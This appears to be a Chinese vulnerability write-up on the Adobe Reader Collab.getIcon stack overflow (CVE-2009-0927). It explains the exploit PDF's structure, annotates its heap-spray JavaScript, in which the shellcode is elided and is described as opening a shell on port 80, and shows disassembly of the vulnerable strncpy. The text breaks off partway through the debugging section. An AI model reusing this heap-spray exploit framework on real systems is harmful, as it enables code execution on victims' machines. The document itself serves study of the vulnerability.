
# 完整剖析 Acrobat Reader - Collab getIcon universal exploiter 之路

> 原文：[`www.pediy.com/kssd/pediy10/98571.html`](https://www.pediy.com/kssd/pediy10/98571.html)

忙活了几天，今天才有空来写点东西。好了，废话不多说，开始。。。

无意中在看雪看见已经有位叫 pandascu 兄弟针对这个漏洞分析写了一篇文章：

http://bbs.pediy.com/showthread.php?t=98139

文章写的很详细，我就在他的基础上扩展扩展。（昨天本来上看雪想加他好友跟他交流交流，可能因为我太水他没有理我）

首先，说说从哪拔 exploit，当然是让人又爱又恨的 milw0rm：

http://www.milw0rm.com/exploits/9579

从上面可以下载到 `2009-CVE-2009-0927_package.zip`

里面有几个文件一个说明，一式两份（一份 pdf，一份 doc），还有两个源代码 `evil_payload.c`，`evil_pdf.py`，然后就是 exploit 文件一个 pdf 和一个 dll，说明里面有详细介绍怎么用这些文件

我懒就不编译了，用现成的 exploit 文件，即 `CVE-2009-0927_exploit.pdf`，至于那个 DLL 是 shellcode 运行后生成的，是用来提取 shellcode 中相关函数的，这个就不具体说了后面另开写 shellcode 的文章来说他的作用。

下面正式开始了，文章分 4 个部分来写：1.PDF 文件格式；2.JavaScript 脚本分析；3.调试；4.利用（exploit）

## 1.PDF 文件格式

用 ue 打开 pdf 文件，直接就可以看到 pdf 文件的结构，这个文件构造的很简单，看来写这个 exploit 的大侠对 pdf 文件格式很是了解啊！（要不然怎么挖漏洞）。

这里我也就简单说下 pdf 的文件格式：

要点一：PDF 文件是一种文本和二进制混排的格式，但是 Adobe 更愿意让人把它当成二进制的文件，所以在里面建议当文件里面的文本太多的时候，可以加一些二进制的注释，好让现有的一些编译器把它当成二进制文件。里面的文本主要是对文件结构的一种描述，二进制的内容来自于三个方面：1、图片；2、字体；3、压缩后的 Post Script。

要点二：文件结构可以分为三方面：

1、首部。用文本编辑器打开的时候就可以看到：`%PDF-1.4` 这样的字眼，其中最后一位就是 PDF 文件格式版本号，软件的版本号总要比文件格式的版本号高 1，比如说 Read 5 能打开的内容就是 4。

2、文件体。里面有若干个的 obj，以及 xref 来组成，OBJ 这种形式。

3、文件尾。没有什么好说的。

下面我就这个 exploit 文件来具体解释下：

```
%PDF-1.1   //这一句也就是 pdf 的文件头 标示版本号 1.1

//下面就是一堆 object 了

1 0 obj    //1 标示这个 obj 的序号用于在，0 是用来标示不同的 obj 现在已经不管了都是 0，obj 是关键字
<<                               //从这里开始各行就是 obj 的属性了 以“/关键字 值”的形式来出现
/Type /Catalog           //额。。。说了这个 obj 的类型是目录 catalog
/Outlines 2 0 R          //这个说了，第二个 obj 是 outlines
/Pages 3 0 R             //这个就不解释了 因为。。。。
/OpenAction 7 0 R    //因为我们看中的是这个 说了/OpenAction 在第 7 个 obj
\>>
endobj                       //这个 obj 完结了

//通过上面这个目录我们看到了最重要的东西/OpenAction 在第七个其他可以忽略了直接去第七个看看，我认为的/OpenAction 意思应该是打开 PDF 时的行为，这里就是挂接 JavaScript 插件的

7 0 obj
<<
/Type /Action
/S /JavaScript      //果然是啊，这才是真正的坏蛋，先不具体看它 把文件格式弄完再说
/JS (
var dll_payload ......

.......

app.doc.Collab.getIcon(buffer+'pwn3D.BYkralor');
)
\>>
endobj

//该 xref 出场了，这个就是 obj 的索引表 它会告诉你每个 obj 的具体位置（学名交叉应用表）

xref
0 8
0000000000 65535 f 
0000000010 00000 n 
0000000098 00000 n 
0000000147 00000 n 
0000000208 00000 n 
0000000400 00000 n 
0000000549 00000 n 
0000000663 00000 n 
trailer                       //对整个 xref 的摘要，说明里面有多少个 OBJ，读的时候从哪个 OBJ 开始解析，信息节点
<<
/Size 8                     //  说了 一共有 8 个 xref 也跟上面的对应起来了

/Root 1 0 R             //这就是第一个节点为什么是目录的原因了
\>>


startxref              //告诉你 xref 是从哪开始的 同时也是文件尾
127077               //就是从这里 注意：里面的数字都是 10 进制记得转换啊
%%EOF              //好了整个文件收尾了
```

好了文件格式大概就说这么多吧。

## 2.JavaScript

这个是本漏洞的罪魁祸首，我们来分析分析它

```
var dll_payload = unescape("%u...");//这个不说了就是 dll 文件

var shellcode = unescape("% u 02 eb...");//shellcode 也不说了作用就是开个 80 口的 shell

garbage = unescape("% u90 90% u 90 90");//填充的 nop 块用来跳转用 你也可以用 inc 1 dec1 之类的来代替

while (garbage.length < 0x100)
garbage += garbage;               //将 garbage 搞大，0x100 那么大

garbage += shellcode + dll_payload;//将 shellcode 和 dll 连接到后面形成个大数据块

nopblock = unescape("% u90 90 %u 90 90");  //又一个 nop 块
headersize = 16;
acl = headersize + garbage.length;  //加个 16 长的头

while (nopblock.length < acl)
nopblock += nopblock;        //把 noplock 扩大到前面的大数据块那么大

fillblock = nopblock.substring(0, acl);        //精确化大小一个 filllock
block = nopblock.substring(0, nopblock.length - acl);
while(block.length + acl < 0x26000)
block = block + block + fillblock;

//总之上面都是在弄一个 0x26000 大小的 nop 块，自己可以精简代码

memory = new Array();

/* ~500MB standalone, ~1GB firefox/IE */
for (i=0;i<1024;i++)
memory[i] = block + garbage;       //这几句是关键，就是堆喷射了 喷多大？ 1024*（0x2600+acl）

//JavaScript 到这一句，在内存中已经把 shellcode 和 nop 块在堆中喷射好了，下面在 buff 中添地址的时候随便找个有喷射 nop 的地方就可以了

var buffer = unescape("%10%10%10%1f");//就是这个可以根据调试的具体情况换换

while(buffer.length < 0x6000)
buffer += buffer;                  //又是申请一个地址块，看你怎么跑出手掌心

app.doc.Collab.getIcon(buffer+'pwn3D.BYkralor');

//这里就是关键点了，调用有漏洞的函数 getIcon，给他传个 buff，长度是 0x6000+'pwn3D.BYkralor'.length
```

后面这几个字符貌似是作者自己的广告，也是 buff 标示，后面调试的时候就知道它的真正作用了，当然，你可以改成你自己的名字，一会改成我的 snowdbg 看看（我很坏）。。。

这个是 pdf 最近爆出的 JavaScript 漏洞的标准利用框架，当然研究过 ActiveX 漏洞的同学也应该了解，这个也是浏览器插件漏洞利用的标准利用框架，赤裸裸的调用问题函数。。。。。

## 3.调试

好了，这里和 pandascu 兄的差不多了 只说几个关键点:

漏洞描述

Adobe Acrobat 和 Reader 没有正确地处理 PDF 文档中所包含的恶意 JavaScript。如果向 Collab 对象的 `getIcon()` 方式提供了特制文件名参数,Adobe Acrobat/Reader plugins Annots.api 模块的内部函数在处理这个超长文件名时就会发生栈溢出。

经过多方打探得知，JavaScript 的运行是依靠 Adobe pdf 系列编辑和阅读软件的一个插件，一般可以用在打开或者关闭文件时，做些事，具体我也没有用过，只会这样做坏事的用。。。。插件的主体就是 `annots.api` 了

首先，静态的来吧，IDA 上场：

把 `annots.api` 丢到 IDA 中，让他先闪一会

然后找到 `getIcon` 函数的位置了，这里我没有弄明白怎么能够准确找到位置，IDA 不会用，哪个大虾指点我下。。。

这里就直接找到了一个经验贴：

弱点发生于模块内部函数 `Annots.2210FCE8`，在处理 `geticon()` 方式提供的图标文件名，没有对文件名长度进行检查，直接拷贝进了缓冲区。

```
2210FDA2 | MOV ESI,0FF

2210FDA7 | PUSH ESI                                 ; /n => FF (255.)

2210FDA8 | LEA EAX,DWORD PTR SS:[EBP+1B9]

2210FDAE | PUSH EBX                                 ; |c

2210FDAF | PUSH EAX                                 ; |s
```

知道了这点就好找了 很容易就从 IDA 中找到了：

```
.text:2211E8AD                mov     esi, 0FFh
.text:2211E8B2                push    esi             ; size_t
.text:2211E8B3                lea     eax, [ebp+2BCh+var_103]
.text:2211E8B9                push    ebx             ; int
.text:2211E8BA                push    eax             ; void *
.text:2211E8BB                mov     [ebp+2BCh+var_104], bl
.text:2211E8C1                call    memset
.text:2211E8C6                push    esi             ; size_t
.text:2211E8C7                lea     eax, [ebp+2BCh+var_203]
.text:2211E8CD                push    ebx             ; int
.text:2211E8CE                push    eax             ; void *
.text:2211E8CF                mov     [ebp+2BCh+var_204], bl
.text:2211E8D5                call    memset
.text:2211E8DA                push    esi             ; size_t
.text:2211E8DB                lea     eax, [ebp+2BCh+var_303]
.text:2211E8DE                push    ebx             ; int
.text:2211E8DF                push    eax             ; void *
.text:2211E8E0                mov     [ebp+2BCh+var_304], bl
.text:2211E8E3                call    memset
.text:2211E8E8                push    2Eh             ; int
.text:2211E8EA                push    edi             ; char *
.text:2211E8EB                call    ds:__imp_strrchr
.text:2211E8F1                mov     esi, eax
.text:2211E8F3                add     esp, 2Ch
.text:2211E8F6                cmp     esi, ebx
.text:2211E8F8                mov     [ebp+2BCh+var_314], esi
.text:2211E8FB                jz      loc_2211E9BF
.text:2211E901                lea     eax, [esi-1]
.text:2211E904                push    offset aNdh     ; "NDH"
.text:2211E909                push    eax             ; char *
.text:2211E90A                call    ds:strpbrk
.text:2211E910                pop     ecx
.text:2211E911                pop     ecx
.text:2211E912                lea     ecx, [esi-1]
.text:2211E915                cmp     eax, ecx
.text:2211E917                jnz     loc_2211E9BF
.text:2211E91D                sub     esi, edi
.text:2211E91F                dec     esi
.text:2211E920                push    esi             ; size_t
.text:2211E921                push    edi             ; char *
.text:2211E922                mov     edi, ds:strncpy
.text:2211E928                lea     eax, [ebp+2BCh+var_104]
.text:2211E92E                push    eax             ; char *
.text:2211E92F                call    edi ; strncpy         这里就是导致栈溢出的地方
```

我就不分析了

下面 OD 登场：

因为前面知道这个函数的位置了 我们就可以用 OD 加载 `acrobat.exe` 后直接按 `ALT+E` 来找到 `annots.api` 的空间，找到 `getIcon` 的入口（不确定到底是不是），下断点（这里说下，大家最好用 Adobe Acrobat Professional 来测试，这样就可以控制 JavaScript 的启动，而且直接在里面编辑 JavaScript 脚本）。

![](img/ea628819ef326b64551288898746d51f.jpg)

先将断点禁止掉让 `acrobat.exe` 运行起来

点击 acrobat 中的 编辑---首选项---JavaScript 把“启用 JavaScript”的钩点掉
